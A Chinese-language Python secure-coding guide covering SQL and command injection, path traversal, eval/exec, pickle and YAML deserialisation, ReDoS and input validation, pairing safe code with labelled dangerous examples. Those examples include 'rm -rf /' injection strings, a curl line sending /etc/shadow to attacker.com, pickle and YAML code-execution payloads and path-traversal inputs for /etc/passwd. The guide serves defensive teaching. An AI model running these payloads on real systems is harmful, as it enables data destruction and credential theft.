# Python输入校验与安全规范详细参考

## 一、SQL注入防护

### 1.1 基本原则
SQL注入是最常见的安全漏洞之一。攻击者通过构造恶意输入，篡改SQL语句逻辑，导致数据泄露、篡改或删除。

**核心原则：永远不要将用户输入直接拼接到SQL语句中**

### 1.2 参数化查询（推荐）

#### sqlite3 示例
```python
import sqlite3

def get_user_by_id(user_id: int) -> dict:
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    # 正确：使用参数化查询（?占位符）
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    
    # 错误：字符串拼接 - 会导致SQL注入
    # cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
    
    return cursor.fetchone()

def search_users(name_pattern: str) -> list:
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    # LIKE查询也要参数化
    cursor.execute("SELECT * FROM users WHERE name LIKE ?", (f"%{name_pattern}%",))
    return cursor.fetchall()
```

#### psycopg2 示例（PostgreSQL）
```python
import psycopg2
from psycopg2 import sql

def get_user_postgresql(username: str) -> dict:
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # 正确：使用 %s 占位符（注意：不是 %s 格式化！）
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
    
    # 动态表名/列名必须使用 sql.Identifier
    table_name = "users"
    cursor.execute(
        sql.SQL("SELECT * FROM {} WHERE active = %s").format(
            sql.Identifier(table_name)
        ), 
        (True,)
    )
    
    return cursor.fetchone()
```

#### MySQL 示例
```python
import mysql.connector

def get_user_mysql(user_id: int) -> dict:
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="password",
        database="app"
    )
    cursor = conn.cursor()
    
    # 使用 %s 占位符
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()
```

### 1.3 ORM框架（更安全）

#### SQLAlchemy 示例
```python
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker
from models import User

engine = create_engine('sqlite:///app.db')
Session = sessionmaker(bind=engine)
session = Session()

# 使用ORM查询（自动参数化）
user = session.query(User).filter(User.username == username_input).first()

# 使用text()和参数绑定
result = session.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username_input}
).fetchone()
```

### 1.4 禁止的危险操作

```python
# 错误示范 - 绝对禁止
user_input = "admin' OR '1'='1"
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
# 实际执行：SELECT * FROM users WHERE name = 'admin' OR '1'='1'
# 会返回所有用户！

# 错误：使用 % 格式化
cursor.execute("SELECT * FROM users WHERE name = '%s'" % user_input)

# 错误：使用 format()
cursor.execute("SELECT * FROM users WHERE name = '{}'".format(user_input))

# 错误：字符串拼接
cursor.execute("SELECT * FROM users WHERE name = '" + user_input + "'")
```

### 1.5 SQL注入防护检查清单

- [ ] 所有用户输入都使用参数化查询
- [ ] LIKE查询的通配符通过参数传递，而非拼接
- [ ] 动态表名/列名使用sql.Identifier（PostgreSQL）或白名单验证
- [ ] IN子句使用参数列表，而非字符串拼接
- [ ] 禁止在SQL中使用f-string、format()、%格式化
- [ ] 使用ORM框架时，确保filter条件正确传参
- [ ] 数据库用户使用最小权限原则

---

## 二、命令注入防护

### 2.1 基本原则
命令注入允许攻击者在系统上执行任意命令，可能导致服务器完全沦陷。

**核心原则：避免shell执行，使用参数列表形式**

### 2.2 安全的subprocess用法

```python
import subprocess
import shlex

def convert_image_safe(input_file: str, output_file: str) -> bool:
    # 正确：使用列表形式传递参数，shell=False（默认）
    result = subprocess.run(
        ['convert', input_file, output_file],
        capture_output=True,
        text=True,
        timeout=30
    )
    return result.returncode == 0

def ping_host_safe(hostname: str) -> str:
    # 先验证hostname格式（白名单）
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise ValueError("Invalid hostname")
    
    # 使用列表形式
    result = subprocess.run(
        ['ping', '-c', '4', hostname],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout

def grep_file_safe(pattern: str, filename: str) -> str:
    # 必须验证pattern，避免注入grep特殊字符
    # 限制pattern为安全的字符集
    if not re.match(r'^[a-zA-Z0-9_\-]+$', pattern):
        raise ValueError("Invalid pattern")
    
    result = subprocess.run(
        ['grep', pattern, filename],
        capture_output=True,
        text=True
    )
    return result.stdout
```

### 2.3 必须避免的危险操作

```python
import os
import subprocess

user_input = "; rm -rf /"

# 错误：使用 os.system - 绝对禁止！
os.system(f"ping {user_input}")
# 实际执行：ping ; rm -rf /

# 错误：使用 shell=True - 非常危险！
subprocess.run(f"ping {user_input}", shell=True)

# 错误：使用 os.popen
os.popen(f"cat {user_input}")

# 错误：使用 commands 模块（已废弃但仍存在）
import commands
commands.getoutput(f"ping {user_input}")
```

### 2.4 特殊情况处理

```python
import shlex

def safe_command_with_shell(filename: str) -> str:
    # 如果必须使用shell=True（极不推荐），必须用shlex.quote转义
    safe_filename = shlex.quote(filename)
    
    result = subprocess.run(
        f"cat {safe_filename}",
        shell=True,  # 仍然不推荐
        capture_output=True,
        text=True
    )
    return result.stdout

def pipe_commands_safe(input_data: str) -> str:
    # 安全地使用管道：避免shell=True，使用管道通信
    p1 = subprocess.Popen(
        ['echo', input_data],
        stdout=subprocess.PIPE
    )
    p2 = subprocess.Popen(
        ['grep', 'pattern'],
        stdin=p1.stdout,
        stdout=subprocess.PIPE
    )
    p1.stdout.close()
    output, _ = p2.communicate()
    return output.decode()
```

### 2.5 命令注入防护检查清单

- [ ] 禁止使用os.system、os.popen、commands模块
- [ ] subprocess调用时，shell=False（默认值）
- [ ] 使用列表形式传递命令和参数
- [ ] 对用户输入进行严格的白名单验证
- [ ] 设置超时参数（timeout）防止阻塞
- [ ] 如必须使用shell=True，必须用shlex.quote转义所有输入
- [ ] 限制可执行的命令白名单
- [ ] 使用最小权限运行进程

---

## 三、路径遍历防护

### 3.1 基本原则
路径遍历攻击允许攻击者访问预期目录之外的文件，可能导致敏感文件泄露。

**核心原则：标准化路径并验证是否在允许范围内**

### 3.2 安全的路径处理

```python
import os
from pathlib import Path

# 定义允许的根目录
ALLOWED_BASE_DIR = Path("/var/www/uploads").resolve()

def safe_read_file(user_filename: str) -> bytes:
    # 构建完整路径
    requested_path = (ALLOWED_BASE_DIR / user_filename).resolve()
    
    # 验证路径是否在允许范围内
    if not str(requested_path).startswith(str(ALLOWED_BASE_DIR)):
        raise ValueError("Path traversal detected - access denied")
    
    # 检查文件是否存在且是文件
    if not requested_path.is_file():
        raise FileNotFoundError("File not found")
    
    return requested_path.read_bytes()

def safe_write_file(user_filename: str, content: bytes) -> None:
    # 验证文件名不包含危险字符
    if '..' in user_filename or user_filename.startswith('/'):
        raise ValueError("Invalid filename")
    
    # 构建安全路径
    safe_path = (ALLOWED_BASE_DIR / user_filename).resolve()
    
    # 再次验证
    if not str(safe_path).startswith(str(ALLOWED_BASE_DIR)):
        raise ValueError("Path traversal detected")
    
    # 确保父目录存在
    safe_path.parent.mkdir(parents=True, exist_ok=True)
    safe_path.write_bytes(content)

def list_safe_files(user_dir: str) -> list:
    # 构建安全路径
    target_dir = (ALLOWED_BASE_DIR / user_dir).resolve()
    
    # 验证路径
    if not str(target_dir).startswith(str(ALLOWED_BASE_DIR)):
        raise ValueError("Access denied")
    
    if not target_dir.is_dir():
        raise NotADirectoryError("Not a directory")
    
    return [f.name for f in target_dir.iterdir() if f.is_file()]
```

### 3.3 常见攻击模式

```python
# 攻击示例：用户输入
malicious_inputs = [
    "../../../etc/passwd",           # Unix路径遍历
    "..\\..\\..\\windows\\system32\\config\\sam",  # Windows路径遍历
    "....//....//....//etc/passwd",  # 双编码绕过
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f",   # URL编码绕过
    "..%252f..%252f..%252f",         # 双重URL编码
    "/etc/passwd",                   # 绝对路径
    "file:///etc/passwd",            # 文件协议
]

# 防御：resolve()会解析所有符号链接和相对路径
# 然后检查是否在允许目录内
```

### 3.4 路径遍历防护检查清单

- [ ] 使用Path.resolve()或os.path.realpath()标准化路径
- [ ] 验证最终路径是否在允许的目录范围内
- [ ] 检查文件名是否包含".."或以"/"开头
- [ ] 禁止用户输入直接作为文件路径
- [ ] 限制允许的文件扩展名白名单
- [ ] 使用白名单验证文件名字符（字母、数字、下划线、点）
- [ ] 考虑符号链接攻击，使用resolve()解析

---

## 四、eval/exec危险

### 4.1 基本原则
eval()和exec()可以执行任意Python代码，是极其危险的操作。

**核心原则：永远不要对不可信输入使用eval/exec**

### 4.2 危险示例

```python
# 危险：远程代码执行
user_input = "__import__('os').system('rm -rf /')"
result = eval(user_input)  # 会执行删除命令！

# 危险：读取敏感文件
user_input = "open('/etc/passwd').read()"
result = eval(user_input)

# 危险：exec同样危险
user_code = """
import os
os.system('curl http://attacker.com/steal?data=' + open('/etc/shadow').read())
"""
exec(user_code)  # 完全沦陷

# 危险：看似无害的计算器
user_expr = "2 + 2"
result = eval(user_expr)  # 如果user_expr被篡改，可执行任意代码
```

### 4.3 安全替代方案

```python
import ast
import operator

# 场景1：数学表达式计算 - 使用ast.literal_eval（安全）
def safe_literal_eval(expr: str):
    # 只支持字面量：字符串、数字、列表、字典、布尔、None
    return ast.literal_eval(expr)

result = ast.literal_eval("[1, 2, 3]")  # 安全：[1, 2, 3]
result = ast.literal_eval("{'key': 'value'}")  # 安全

# 场景2：数学表达式 - 使用安全的表达式解析器
ALLOWED_OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
    ast.USub: operator.neg,
}

def safe_eval_math(expr: str) -> float:
    """安全地计算数学表达式"""
    node = ast.parse(expr, mode='eval').body
    
    def evaluate(node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.Constant):
            if isinstance(node.value, (int, float)):
                return node.value
            raise ValueError("Only numbers allowed")
        elif isinstance(node, ast.BinOp):
            left = evaluate(node.left)
            right = evaluate(node.right)
            op_type = type(node.op)
            if op_type in ALLOWED_OPERATORS:
                return ALLOWED_OPERATORS[op_type](left, right)
            raise ValueError(f"Operator {op_type} not allowed")
        elif isinstance(node, ast.UnaryOp):
            operand = evaluate(node.operand)
            op_type = type(node.op)
            if op_type in ALLOWED_OPERATORS:
                return ALLOWED_OPERATORS[op_type](operand)
            raise ValueError(f"Operator {op_type} not allowed")
        else:
            raise ValueError(f"Expression type {type(node)} not allowed")
    
    return evaluate(node)

# 安全使用
result = safe_eval_math("2 + 3 * 4")  # 14
result = safe_eval_math("(10 - 2) / 4")  # 2.0

# 场景3：JSON数据解析
import json
data = json.loads(json_string)  # 安全，只解析JSON

# 场景4：配置文件解析
import configparser
config = configparser.ConfigParser()
config.read('config.ini')  # 安全
```

### 4.4 eval/exec防护检查清单

- [ ] 禁止对用户输入使用eval()或exec()
- [ ] 使用ast.literal_eval()处理字面量
- [ ] 数学表达式使用自定义解析器
- [ ] JSON数据使用json.loads()
- [ ] 配置文件使用configparser
- [ ] 代码审查时搜索所有eval/exec调用
- [ ] 如必须使用，确保输入经过严格白名单验证

---

## 五、pickle反序列化安全

### 5.1 基本原则
pickle可以序列化/反序列化任意Python对象，反序列化恶意数据可导致远程代码执行。

**核心原则：不要对不可信数据使用pickle.loads()**

### 5.2 危险示例

```python
import pickle

# 攻击者构造的恶意pickle数据
malicious_payload = b"cos\nsystem\n(S'rm -rf /'\ntR."

# 危险：反序列化会执行命令
pickle.loads(malicious_payload)  # 执行 rm -rf /

# 攻击者可以构造任意代码
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
pickle.loads(payload)  # 执行 whoami
```

### 5.3 安全替代方案

```python
import json
import yaml

# 方案1：使用JSON（推荐）
def safe_serialize(data: dict) -> str:
    return json.dumps(data)

def safe_deserialize(json_str: str) -> dict:
    return json.loads(json_str)

# 方案2：使用YAML（需安全加载，见下节）
def safe_yaml_load(yaml_str: str) -> dict:
    return yaml.safe_load(yaml_str)

# 方案3：使用MessagePack
import msgpack
data = msgpack.packb({'key': 'value'})
loaded = msgpack.unpackb(data, raw=False)

# 方案4：使用Protocol Buffers / Avro
# 适用于高性能场景
```

### 5.4 必须使用pickle的场景

```python
import pickle
import hashlib
import hmac

SECRET_KEY = b'your-secret-key-here'

def safe_pickle_dumps(obj: object) -> bytes:
    """带签名的序列化"""
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    return signature + data

def safe_pickle_loads(signed_data: bytes) -> object:
    """带签名验证的反序列化"""
    if len(signed_data) < 32:
        raise ValueError("Invalid data")
    
    signature = signed_data[:32]
    data = signed_data[32:]
    
    # 验证签名
    expected_signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected_signature):
        raise ValueError("Invalid signature - data may be tampered")
    
    return pickle.loads(data)

# 使用
original = {'data': [1, 2, 3]}
signed = safe_pickle_dumps(original)
restored = safe_pickle_loads(signed)
```

### 5.5 pickle安全检查清单

- [ ] 禁止对不可信数据使用pickle.loads()
- [ ] 使用JSON、YAML、MessagePack等安全格式
- [ ] 如必须使用pickle，添加HMAC签名验证
- [ ] 限制反序列化的数据来源（仅信任内部数据）
- [ ] 使用白名单限制可反序列化的类

---

## 六、YAML安全加载

### 6.1 基本原则
PyYAML的yaml.load()默认可以加载任意Python对象，存在远程代码执行风险。

**核心原则：始终使用yaml.safe_load()**

### 6.2 危险示例

```python
import yaml

# 恶意YAML数据
malicious_yaml = """
!!python/object/apply:os.system
args: ['rm -rf /']
"""

# 危险：yaml.load()会执行任意Python代码
yaml.load(malicious_yaml, Loader=yaml.FullLoader)  # 执行 rm -rf /

# 其他危险的Loader
yaml.load(malicious_yaml, Loader=yaml.Loader)      # 危险
yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader) # 更危险
yaml.load(malicious_yaml)  # 已弃用，但仍危险
```

### 6.3 安全用法

```python
import yaml

def safe_yaml_load(yaml_string: str) -> dict:
    """安全加载YAML"""
    return yaml.safe_load(yaml_string)

def safe_yaml_load_file(filepath: str) -> dict:
    """安全加载YAML文件"""
    with open(filepath, 'r', encoding='utf-8') as f:
        return yaml.safe_load(f)

# 使用示例
config_yaml = """
database:
  host: localhost
  port: 5432
  name: myapp
debug: true
"""

config = yaml.safe_load(config_yaml)
# {'database': {'host': 'localhost', 'port': 5432, 'name': 'myapp'}, 'debug': True}

# PyYAML >= 5.1 推荐用法
yaml.safe_load(yaml_string)  # 推荐
yaml.load(yaml_string, Loader=yaml.SafeLoader)  # 等价

# 如果需要加载自定义类型，使用yaml.YAMLObject
class Config(yaml.YAMLObject):
    yaml_loader = yaml.SafeLoader
    yaml_tag = '!Config'
    
    def __init__(self, db_host, db_port):
        self.db_host = db_host
        self.db_port = db_port
```

### 6.4 YAML安全检查清单

- [ ] 始终使用yaml.safe_load()
- [ ] 禁止使用yaml.load()（无Loader参数）
- [ ] 禁止使用yaml.FullLoader、yaml.UnsafeLoader
- [ ] 验证加载后的数据结构
- [ ] 限制YAML文件来源

---

## 七、正则表达式DoS防护

### 7.1 基本原则
某些正则表达式可能导致灾难性回溯，造成CPU占用100%或服务拒绝。

**核心原则：避免使用包含重叠量词的复杂正则**

### 7.2 危险示例

```python
import re
import time

# 危险的正则：包含重叠量词
evil_regex = r'(a+)+$'

# 正常输入 - 快速
re.match(evil_regex, 'aaaaaaa')  # 快

# 恶意输入 - 指数级时间
start = time.time()
re.match(evil_regex, 'aaaaaaaaaaaaaaaaaaaa!')  # 巨大的时间消耗
print(f"Time: {time.time() - start}s")  # 可能数十秒

# 其他危险模式
dangerous_patterns = [
    r'(a|aa)+',      # 重叠选择
    r'(a|a)+',       # 重复选择
    r'(.*)*b',       # 嵌套量词
    r'(a+)+',        # 嵌套量词
    r'([a-zA-Z]+)*', # 嵌套量词
]
```

### 7.3 安全用法

```python
import re

# 方案1：简化正则表达式
# 危险：r'(a+)+$'
# 安全：r'a+$'

# 方案2：使用原子组（Python不支持）或占有量词（Python不支持）
# 使用re模块的最佳实践

# 方案3：限制输入长度
def safe_regex_match(pattern: str, text: str, max_length: int = 1000) -> re.Match:
    if len(text) > max_length:
        raise ValueError(f"Input too long, max {max_length} characters")
    return re.match(pattern, text)

# 方案4：使用正则超时
import signal
from contextlib import contextmanager

class TimeoutException(Exception):
    pass

@contextmanager
def time_limit(seconds: int):
    def signal_handler(signum, frame):
        raise TimeoutException("Timed out!")
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

def regex_with_timeout(pattern: str, text: str, timeout: int = 1) -> re.Match:
    with time_limit(timeout):
        return re.match(pattern, text)

# 方案5：使用第三方库 regex（支持超时）
# pip install regex
import regex

def safe_regex_search(pattern: str, text: str, timeout: int = 5):
    return regex.search(pattern, text, timeout=timeout)
```

### 7.4 ReDoS防护检查清单

- [ ] 避免嵌套量词如(a+)+
- [ ] 避免重叠选择如(a|aa)+
- [ ] 限制输入字符串长度
- [ ] 对复杂正则设置超时
- [ ] 测试正则性能，使用恶意识别输入测试
- [ ] 考虑使用非正则方法处理复杂匹配
- [ ] 使用regex库替代re库（支持超时）

---

## 八、输入验证

### 8.1 基本原则
输入验证是安全的第一道防线。验证类型、长度、格式、范围。

**核心原则：白名单验证优于黑名单，尽早验证，多次验证**

### 8.2 使用Pydantic验证

```python
from pydantic import BaseModel, validator, constr, conint, EmailStr, HttpUrl
from typing import List, Optional
from datetime import datetime
import re

class UserCreate(BaseModel):
    username: constr(min_length=3, max_length=20, pattern=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    password: constr(min_length=8, max_length=100)
    age: conint(ge=0, le=150)
    bio: Optional[constr(max_length=500)] = None
    website: Optional[HttpUrl] = None
    
    @validator('password')
    def password_strength(cls, v):
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain uppercase letter')
        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain lowercase letter')
        if not re.search(r'\d', v):
            raise ValueError('Password must contain digit')
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', v):
            raise ValueError('Password must contain special character')
        return v
    
    @validator('username')
    def username_not_reserved(cls, v):
        reserved = ['admin', 'root', 'system', 'guest']
        if v.lower() in reserved:
            raise ValueError('Username is reserved')
        return v

# 使用
try:
    user = UserCreate(
        username="john_doe",
        email="john@example.com",
        password="SecurePass123!",
        age=25
    )
except ValueError as e:
    print(f"Validation error: {e}")
```

### 8.3 手动验证

```python
import re
from typing import Any, Optional

def validate_username(username: str) -> str:
    """验证用户名"""
    if not isinstance(username, str):
        raise TypeError("Username must be a string")
    if len(username) < 3 or len(username) > 20:
        raise ValueError("Username must be 3-20 characters")
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Username can only contain letters, numbers, and underscores")
    if username.lower() in ['admin', 'root', 'system']:
        raise ValueError("Username is reserved")
    return username

def validate_email(email: str) -> str:
    """验证邮箱"""
    if not isinstance(email, str):
        raise TypeError("Email must be a string")
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValueError("Invalid email format")
    return email.lower()

def validate_integer(value: Any, min_val: Optional[int] = None, max_val: Optional[int] = None) -> int:
    """验证整数"""
    try:
        num = int(value)
    except (TypeError, ValueError):
        raise ValueError("Must be an integer")
    
    if min_val is not None and num < min_val:
        raise ValueError(f"Must be at least {min_val}")
    if max_val is not None and num > max_val:
        raise ValueError(f"Must be at most {max_val}")
    
    return num

def validate_file_extension(filename: str, allowed_extensions: list) -> str:
    """验证文件扩展名"""
    if '.' not in filename:
        raise ValueError("Filename must have an extension")
    
    ext = filename.rsplit('.', 1)[1].lower()
    if ext not in [e.lower() for e in allowed_extensions]:
        raise ValueError(f"File extension must be one of: {allowed_extensions}")
    
    return filename

def validate_in_list(value: str, allowed: list, case_sensitive: bool = False) -> str:
    """验证值在允许列表中"""
    if not case_sensitive:
        value = value.lower()
        allowed = [a.lower() for a in allowed]
    
    if value not in allowed:
        raise ValueError(f"Value must be one of: {allowed}")
    
    return value
```

### 8.4 输入验证检查清单

- [ ] 验证数据类型（isinstance）
- [ ] 验证字符串长度
- [ ] 验证数值范围
- [ ] 验证格式（正则表达式）
- [ ] 使用白名单验证枚举值
- [ ] 使用Pydantic进行结构化验证
- [ ] 验证文件类型和扩展名
- [ ] 转义或验证特殊字符
- [ ] 处理None/空值情况
- [ ] 记录验证失败日志

---

## 九、综合安全检查清单

### 9.1 代码审查检查项

```markdown
## 输入安全代码审查清单

### SQL注入
- [ ] 所有数据库查询使用参数化
- [ ] 禁止字符串拼接SQL
- [ ] LIKE查询参数化

### 命令注入
- [ ] 禁止os.system/os.popen
- [ ] subprocess使用列表形式
- [ ] shell=False（默认）
- [ ] 输入白名单验证

### 路径遍历
- [ ] 使用resolve()标准化路径
- [ ] 验证路径在允许范围内
- [ ] 禁止用户输入直接作为路径

### 代码注入
- [ ] 禁止对用户输入使用eval/exec
- [ ] 使用ast.literal_eval或json.loads

### 反序列化
- [ ] 禁止对不可信数据pickle.loads
- [ ] 使用json或yaml.safe_load

### 正则DoS
- [ ] 避免嵌套量词
- [ ] 限制输入长度
- [ ] 设置超时

### 输入验证
- [ ] 验证类型、长度、格式
- [ ] 使用Pydantic
- [ ] 白名单验证
```

### 9.2 快速参考表

| 风险类型 | 危险操作 | 安全替代 |
|---------|---------|---------|
| SQL注入 | f-string拼接SQL | 参数化查询(?, %s) |
| 命令注入 | os.system, shell=True | subprocess列表形式 |
| 路径遍历 | 直接使用用户路径 | resolve() + 范围检查 |
| 代码注入 | eval(), exec() | ast.literal_eval(), json |
| Pickle RCE | pickle.loads() | json, yaml.safe_load() |
| YAML RCE | yaml.load() | yaml.safe_load() |
| ReDoS | 嵌套量词(a+)+ | 简化正则，超时 |
| 输入验证 | 黑名单过滤 | 白名单 + Pydantic |
